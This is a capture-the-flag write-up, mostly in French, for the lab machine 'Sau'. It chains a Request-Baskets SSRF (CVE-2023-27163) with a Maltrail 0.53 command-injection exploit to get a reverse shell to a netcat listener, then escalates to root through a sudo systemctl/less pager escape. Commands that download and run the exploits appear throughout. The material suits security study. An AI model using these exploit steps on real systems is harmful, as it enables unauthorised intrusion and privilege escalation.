# sau
>> easy

Premierement nous faisons un nmap pour detecter les differents services.

```
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
```

nmap detect 4 service mais dont 2 serveur web le 55555 et 80 malheuresement le 80 est filtre et donc inacessible.
Je me connecte donc au serveur sur le 55555.

image

Ce serveur est un service request basket en version 1.2.1. Cette version est vulnerable a une SSRF j'utilise donc un exploit afin de profiter de cette vulnerability.

```shell
$ wget https://raw.githubusercontent.com/mathias-mrsn/request-baskets-v121-ssrf/master/exploit.py
$ python3 exploit.py http://10.10.11.224:55555 http://127.0.0.1:80
Exploit for SSRF vulnerability on Request-Baskets (1.2.1) (CVE-2023-27163).
Exploit successfully executed.
Any request sent to http://10.10.11.224:55555/usqudt will now be forwarded to the service on http://127.0.0.1:80.
```

Cette exploit utilise une vulnerabilite nomme Server Side Request Forgery cette vulnerabilite vient du faite que request basket redirige du cote serveur les request ce qui permet donc d'acceder a des services interne et prive en envoyant une requete a l'api '/api/basket/{name}'.

Maintenant que les requests sont redirige alors nous pouvons faire des request au service sur le port 80 en envoyant une request au basket que nous venons de creer avec le script.

Voici le site quand nous allons sur `http://10.10.11.224:55555/usqudt`.

image

Le service est un service Maltrail en version 0.53. Nous sommes vraiment chanceux car cette version est vulnerable a une RCE. Une vulnerabilite du au fait que durant le login le champ username est envoye dans un shell et donc on peut executer du code par le serveur. Ici ce code sera un reverse shell.

```
$ nc -lvp 9000
```
```
$ wget https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/main/exploit.py
$ python3 maltrait_ex.py 10.10.14.50 9000 http://10.10.11.224:55555/usqudt
Running exploit on http://10.10.11.224:55555/usqudt/login
```

Now I have a shell in the nc window.

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
puma@sau:/opt/maltrail$ whoami
whoami
puma
puma@sau:/opt/maltrail$ cat ~/user.txt
cat ~/user.txt
********************************
puma@sau:/opt/maltrail$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

Quand je lance cette commande en tant que sudo le prompt s'affiche comme si il utilise la command less. J'essaye donc de taper une commande sous ce format `!whoami`.

```
sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!ls
!llss!ls
CHANGELOG     core    maltrail-sensor.service  plugins           thirdparty
CITATION.cff  docker  maltrail-server.service  requirements.txt  trails
LICENSE       h       maltrail.conf            sensor.py
README.md     html    misc                     server.py
```

Bingo I can print the flag.

```
!done  (press RETURN)!cat /root/root.txt

!ccaatt  //rroooott//rroooott..ttxxtt!cat /root/root.txt
********************************
```











